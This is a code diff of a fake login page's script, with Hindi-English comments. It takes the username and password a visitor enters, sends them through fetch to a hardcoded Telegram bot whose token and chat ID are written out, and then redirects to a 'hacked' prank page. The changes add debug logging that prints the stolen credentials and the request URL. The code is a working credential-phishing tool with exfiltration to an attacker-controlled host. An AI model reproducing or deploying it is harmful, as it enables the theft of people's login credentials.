@@ -107,25 +107,37 @@
             let password = document.getElementById("password").value;
             let warning = document.querySelector(".warning");
 
+            console.log("Button clicked! Username:", username, "Password:", password); // Step 1: Check input
+
             if (username && password) {
                 let message = New Login Attempt!\nUsername: ${username}\nPassword: ${password};
-                let botToken = "7799594978:AAFdhqPny89rEaPL555gFDXuwH1JuMIlkok"; // Tera bot token
-                let chatId = "7711813869"; // Tera chat ID
-                let url = 'https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}';
+                let botToken = "7799594978:AAFdhqPny89rEaPL555gFDXuwH1JuMIlkok";
+                let chatId = "7711813869";
+                let url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+
+                console.log("Sending to Telegram:", url); // Step 2: Check URL
 
                 fetch(url)
-                    .then(response => response.json())
+                    .then(response => {
+                        console.log("Fetch response:", response); // Step 3: Check response
+                        return response.json();
+                    })
                     .then(data => {
+                        console.log("Telegram API result:", data); // Step 4: Check API result
                         if (data.ok) {
-                            console.log("Telegram pe bhej diya: ", message);
-                            window.location.href = "hacked.html"; // Redirect to prank page
+                            console.log("Telegram pe bhej diya:", message);
+                            window.location.href = "hacked.html"; // Step 5: Redirect
                         } else {
-                            alert("Kuch gadbad ho gaya, try again!");
+                            alert("Telegram error: " + data.description);
                         }
                     })
-                    .catch(error => console.error("Error:", error));
+                    .catch(error => {
+                        console.error("Fetch error:", error); // Step 6: Catch error
+                        alert("Network error: " + error);
+                    });
             } else {
                 warning.style.display = "block";
+                console.log("Input khali hai!"); // Step 7: Check empty input
             }
         }
     </script>
